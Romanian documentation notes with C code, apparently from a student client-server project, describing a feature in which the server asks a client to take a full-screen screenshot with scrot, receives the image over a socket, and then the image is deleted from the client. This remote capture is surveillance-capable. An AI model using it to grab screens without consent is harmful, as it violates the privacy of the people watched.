Screenshot-urile vor fi facute folosind utilitarul *scrot*(implementarea in `c` va fi folosind functia **system()**)
- Mai intai server-ul va face o cerere clientului de screenshot, iar clientul va face aceasta comanda si o va trimite server-ului.
- Utilitarul **scrot** va face screenshot la intreg ecranul clientului, iar print comanda *--file* se va specifica numele fisierului.
- Dupa transmiterea imaginii, programul va sterge poza de pe dispozitivul clientului

>[!WARNING]
> utilitarul **scrot** trebuie instalat #install_util 

```c
void handleScreenshotOpcode()

{

message_t msg;

  

strcpy(msg.buffer, "");

msg.opCode = 'S';

msg.size = 0;

sendMessage(clientData.serverSocket, &msg);

  

char filename[BUFFER_SIZE];

strcpy(filename, "/tmp/screenshotTmp.jpg");

  

pid_t pid = fork();

  

if (pid == 0)

{

execlp("scrot", "scrot", filename, "--quality", "50", NULL);

perror("execlp failed");

exit(EXIT_FAILURE);

}

else if (pid > 0)

{

wait(NULL);

}

else

{

msg.opCode = 'E';

strcpy(msg.buffer, "Failed to fork for Screenshot.\n");

msg.size = strlen(msg.buffer);

sendMessage(clientData.serverSocket, &msg);

}

sendFile(clientData.serverSocket, filename);

  

remove(filename);

}
```

In plus, functia `sendFile` ajuta la transmiterea imaginii ca fisier binar, iar `recvFile` citeste imaginea

```c
void sendFile(int sock, const char *filename)

{

int file_fd = open(filename, O_RDONLY);

if (file_fd < 0)

{

perror("Failed to open file");

exit(EXIT_FAILURE);

}

  

char buffer[BUFFER_SIZE];

ssize_t bytes_read, bytes_sent;

// printf("In function:\n");

while ((bytes_read = read(file_fd, buffer, sizeof(buffer))) > 0)

{

// printf("Sending ||%s||:%d:\n", buffer, (int)bytes_read);

bytes_sent = send(sock, buffer, bytes_read, 0);

if (bytes_sent < 0)

{

perror("Failed to send data");

close(file_fd);

exit(EXIT_FAILURE);

}

}

  

if (bytes_read < 0)

{

perror("Failed to read file");

}

sleep(1);

// printf("Sending Stop:\n");

fflush(0);

strcpy(buffer, "STOP");

send(sock, buffer, sizeof("STOP"), 0);

close(file_fd);

}

  

void recvFile(int sock, const char *filename)

{

char buffer[BUFFER_SIZE];

ssize_t bytes_received, bytes_written;

int fileFd = open(filename, O_CREAT | O_WRONLY, 0666);

  

while ((bytes_received = recv(sock, buffer, sizeof(buffer), 0)) > 0)

{

// printf("||%s||:%lu:\n", buffer, bytes_received);

// fflush(0);

if (buffer[bytes_received - 2] == 'P' && buffer[bytes_received - 3] == 'O')

{

// printf("recieved Stop: %s\n", buffer);

// fflush(0);

break;

}

bytes_written = write(fileFd, buffer, bytes_received);

if (bytes_written < 0)

{

perror("Failed to write to file");

close(fileFd);

return;

}

}

  

if (bytes_received < 0)

{

perror("Failed to receive data");

}

else

{

// printf("Client connected successfully. Press a key to continue.\n");

}

  

close(fileFd);

}
```